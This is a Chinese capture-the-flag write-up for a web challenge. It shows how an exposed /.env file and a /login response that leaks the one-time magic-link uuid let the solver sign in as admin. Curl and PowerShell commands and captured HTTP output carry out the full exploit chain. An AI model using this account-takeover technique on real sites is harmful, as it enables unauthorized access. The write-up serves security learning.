# Magic Link 2

## 题目信息

- 类型：Web
- 题目状态：已解出
- 目标：https://bluehens-magic-link.chals.io/
- 核心漏洞：Magic link 的一次性 `uuid` 直接在 `/login` 响应里返回，随后可通过 `/login/<uuid>` 直接换取登录态

## 入口与现象

2026-04-18 实测首页依然是一个极简的 Magic Link 登录页，前端会把邮箱提交到 `/login`：

```html
<form id="magic-link-form">
  <input type="email" name="email" placeholder="Enter Email" required>
  <button type="submit">Send Magic Link</button>
</form>
```

先做基础枚举，`robots.txt` 里给了几个隐藏路径：

```text
User-agent: *
Disallow: /inbox
Disallow: /dashboard
Disallow: /.env
```

继续访问 `/.env`，可以看到：

```text
TEDDYS_EMAIL=teddy@udctf.com
TEDDYS_TOKEN=udctf{d0n7_h057_y0ur_3nv_f113}
ADMIN_EMAIL=admin@udctf.com
INBOX_URL=http://localhost:5050/inbox?token=${TEDDYS_TOKEN}
```

这里的 `TEDDYS_TOKEN` 正好是第一层的 flag，但不是这题的最终答案。真正需要注意的是：

- 站点里确实存在 `admin@udctf.com`
- 题目强调的是 Magic Link 登录
- 所以应该继续看 magic link 本身有没有实现缺陷

## 分析过程

### 1. 先观察 `/login` 的真实返回

向 `/login` 提交管理员邮箱：

```http
POST /login HTTP/1.1
Host: bluehens-magic-link.chals.io
Content-Type: multipart/form-data

email=admin@udctf.com
```

返回 JSON：

```json
{
  "datetime": "2026-04-18T09:53:46.970346+00:00",
  "email": "admin@udctf.com",
  "ip-address": "10.1.0.20",
  "message": "Magic link generated, check your email.",
  "uuid": "NHfaAN3pn9mvsXjAfR138g"
}
```

这里最关键的问题是：后端把 magic link 对应的一次性 `uuid` 直接返回给前端了。

正常设计里，这种 token 应该只出现在邮件里，不应该直接暴露给请求者。既然已经拿到了 `uuid`，那下一步就应该试它是不是可以直接当登录链接使用。

### 2. 发现真正的 magic link 入口是 `/login/<uuid>`

访问：

```http
GET /login/NHfaAN3pn9mvsXjAfR138g HTTP/1.1
Host: bluehens-magic-link.chals.io
```

服务端返回重定向，并设置了 session：

```http
HTTP/1.1 302 FOUND
Location: /dashboard
Set-Cookie: session=...; HttpOnly; Path=/
```

我在 2026-04-18 的一次顺序复现实测中，服务端明确给管理员下发了登录态：

```text
Set-Cookie: session=eyJ1c2VyIjoiYWRtaW5AdWRjdGYuY29tIn0....
```

把这个 session 带去访问 `/dashboard`：

```http
GET /dashboard HTTP/1.1
Host: bluehens-magic-link.chals.io
Cookie: session=...
```

返回内容：

```html
<h1>Welcome Admin</h1><p>Flag: udctf{y0u_4r3_m4g1c_l1nk_m4st3r}</p>
```

到这里第二层 flag 就出来了。

## 利用过程

1. 查看 `robots.txt`，发现 `/.env`、`/inbox`、`/dashboard`。
2. 读取 `/.env`，确认题目里存在 `admin@udctf.com`，并注意到前面的 `TEDDYS_TOKEN` 只是第一层 flag。
3. 向 `/login` 提交 `admin@udctf.com`，拿到响应中的 `uuid`。
4. 直接访问 `/login/<uuid>`，服务端会设置管理员 session 并跳转到 `/dashboard`。
5. 带着该 session 访问 `/dashboard`，读取最终 flag。

## 关键 payload / 命令

```bash
curl -i https://bluehens-magic-link.chals.io/robots.txt
curl -i https://bluehens-magic-link.chals.io/.env
curl -i -X POST -F "email=admin@udctf.com" https://bluehens-magic-link.chals.io/login
curl -i https://bluehens-magic-link.chals.io/login/<uuid>
curl -i -b "session=<cookie>" https://bluehens-magic-link.chals.io/dashboard
```

为了稳定复现，我最后使用了同一个会话顺序完成整个链条：

```powershell
$s = New-Object Microsoft.PowerShell.Commands.WebRequestSession
$login = Invoke-RestMethod -Method Post -Uri 'https://bluehens-magic-link.chals.io/login' -Form @{ email = 'admin@udctf.com' }
$uuid = $login.uuid
Invoke-WebRequest -Uri ("https://bluehens-magic-link.chals.io/login/" + $uuid) -WebSession $s
Invoke-WebRequest -Uri 'https://bluehens-magic-link.chals.io/dashboard' -WebSession $s
```

关键输出：

```text
ADMIN_UUID=X0_5VEkDD9E6njtVNrhYCQ
200
<h1>Welcome Admin</h1><p>Flag: udctf{y0u_4r3_m4g1c_l1nk_m4st3r}</p>
```

## Flag

```text
udctf{y0u_4r3_m4g1c_l1nk_m4st3r}
```

## 总结

这题表面上先用 `/.env` 给了一个很像终点的第一层 flag，但真正的漏洞在 magic link 的实现本身。后端把登录用的一次性 `uuid` 直接回给前端，等于把邮件里的敏感链接主动泄露给了攻击者。只要知道管理员邮箱，就可以自己申请 magic link、自己消费 `/login/<uuid>`、再直接进入管理员面板拿到最终 flag。
